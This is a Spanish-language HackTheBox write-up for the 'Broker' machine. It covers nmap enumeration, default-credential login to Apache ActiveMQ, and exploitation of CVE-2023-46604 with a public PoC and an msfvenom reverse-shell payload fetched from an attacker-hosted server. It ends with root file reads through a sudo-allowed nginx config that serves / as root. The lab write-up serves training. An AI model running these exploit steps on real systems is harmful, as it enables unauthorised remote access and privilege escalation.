---
title: "Broker - HackTheBox"
layout: post
date: 2023-12-20 08:10
tag: 
- hackthebox
- Broker
- Abusing Sudoers
- nginx
- RCE
- msfvenom
image: /assets/images/hackthebox/Broker.png
headerImage: true
projects: false
hidden: false
description: "Broker - HackTheBox"
category: blog
author: CAHOn3R
externalLink: false
---

# Enumeración

Como casi siempre empezamos la enumeración realizando un escaneo de puertos con **nmap**

```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn -oG allPorts 10.10.11.243

[*] Open ports: 22,80,1883,5672,7777,8161,37549,61613,61614,61616

-p- # para escanear los 65535 puertos que existen
-sS # para realizar un escaneo tipo "SYN scan"
--min-rate 5000 # para indicarle no se envien menos de 5k paquetes por segundo
--open # para que solo reporte puertos abiertos
-vvv # para que muestre por consola lo máximo posible y lo antes posible
-n # para realizar un escaneo prescindiendo de la resolución de nombres de dominio
-Pn # para que no realice la detección del estado del host antes de iniciar el escaneo
-oG # para especificar un formato de salida en modo greppable en el archivo allPorts
```
Y lanzamos los scripts básicos de reconocimiento para tratar de detectar la versiones y servicios de cada uno de ellos

```bash
nmap -sCV -p 22,80,1883,5672,7777,8161,37549,61613,61614,61616 10.10.11.243 -oN targeted
```
Yo lo exporto al archivo targeted para poder leerlo más cómodamente y tenerlo accesible en el futuro.

```java
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: nginx/1.18.0 (Ubuntu)
1883/tcp  open  mqtt
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     ActiveMQ/Advisory/MasterBroker: 
|_    ActiveMQ/Advisory/Consumer/Topic/#: 
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
7777/tcp  open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
|   maxfiles limit reached (10)
| SIZE    TIME               FILENAME
| -       06-Nov-2023 01:10  bin/
| -       06-Nov-2023 01:10  bin/X11/
| 963     17-Feb-2020 14:11  bin/NF
| 129576  27-Oct-2023 11:38  bin/VGAuthService
| 51632   07-Feb-2022 16:03  bin/%5B
| 35344   19-Oct-2022 14:52  bin/aa-enabled
| 35344   19-Oct-2022 14:52  bin/aa-exec
| 31248   19-Oct-2022 14:52  bin/aa-features-abi
| 14478   04-May-2023 11:14  bin/add-apt-repository
| 14712   21-Feb-2022 01:49  bin/addpart
|_
|_http-server-header: nginx/1.18.0 (Ubuntu)
8161/tcp  open  http       Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
37549/tcp open  tcpwrapped
61613/tcp open  stomp      Apache ActiveMQ
| fingerprint-strings: 
|   HELP4STOMP: 
|     ERROR
|     content-type:text/plain
|     message:Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
|_    java.lang.Thread.run(Thread.java:750)
61614/tcp open  http       Jetty 9.4.39.v20210325
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title.
|_http-server-header: Jetty(9.4.39.v20210325)
61616/tcp open  apachemq   ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
```
Vemos mucha información, muchos servicios, muchas versiones... Vamos a continuar con la enumeración.

```bash
whatweb http://10.10.11.243/
http://10.10.11.243/ [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.243], PoweredBy[Jetty://], Title[Error 401 Unauthorized], WWW-Authenticate[ActiveMQRealm][basic], nginx[1.18.0]
```
Aquí vemos que el servidor web lo corre un Linux, y nos dice "Unauthorized" así que imagino que tendrá que haber una autentificación previa para acceder a donde sea que nos lleve esto.
[<img src="/assets/images/hackthebox/captura1.png">](/assets/images/hackthebox/captura1.png)
Y efectivamente hay un panel de autentificación, pruebo `admin:admin` y para dentro... Una vez dentro vemos un [Apache ActiveMQ](https://genos.es/activemq-soporte/) que además ya habíamos visto antes con **nmap** en el puerto **61616** con la versión **5.15.15**, solo por confirmar, hago clic en "Support" y veo lo siguiente.[<img src="/assets/images/hackthebox/captura2.png">](/assets/images/hackthebox/captura2.png)
# Explotación

Tras una breve, muy breve búsqueda en Google doy con este [poc RCE](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ), me lo descargo en mí máquina atacante y lo ejecuto tal y como dice en el **poc**.
```bash
git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell
cd CVE-2023-46604-RCE-Reverse-Shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST={Your_Listener_IP/Host} LPORT={Your_Listener_Port} -f elf -o test.elf
python3 -m http.server 8001
./ActiveMQ-RCE -i {Target_IP} -u http://{IP_Of_Hosted_XML_File}:8001/poc-linux.xml
```

Tal y como nos explican editamos el **poc-linux.xml** para que apunte a nuestra **IP**, compartimos un servidor con **Python** para que el script pueda acceder a nuestro archivo **.elf**[<img src="/assets/images/hackthebox/captura3.png">](/assets/images/hackthebox/captura3.png)
Recibimos la reverse shell y hacemos el tratamiento de la **TTY**
```bash
script /dev/null -c bash
^Z # CTRL+Z
stty raw -echo; fg
	reset xterm
export TERM=xterm SHELL=bash
stty rows X columns X # tus filas y columnas 
```

> Puedes ver tus filas y columnas en tu máquina con stty -a

# PrivEsc 

Ya dentro de la máquina hacemos el típico 
```bash
sudo -l
(ALL : ALL) NOPASSWD: /usr/sbin/nginx
```
y vemos que podemos ejecutar como cualquier usuario **nginx** 

Con la ayuda de ChatGPT creo un archivo confing para nginx
```nginx
user root; 
events { 
worker_connections 1024;
} 
http { 
	server { 
		listen 443; 
		root /; 
		autoindex on;
		}
}
```
Esto se encarga básicamente de crear un **"LFI"** ejecutado como root en la máquina víctima, entonces podemos ejecutarlo con el parámetro `-c` de **nginx** y todas las peticiones que mandemos al `localhost` por el puerto **443** se interpretaran como root.

```bash
activemq@broker$ sudo /usr/sbin/nginx -c /tmp/lfi.conf
activemq@broker$ curl localhost:443/root/root.txt
5a0ddd1174678ff246d93285c421e95f
```

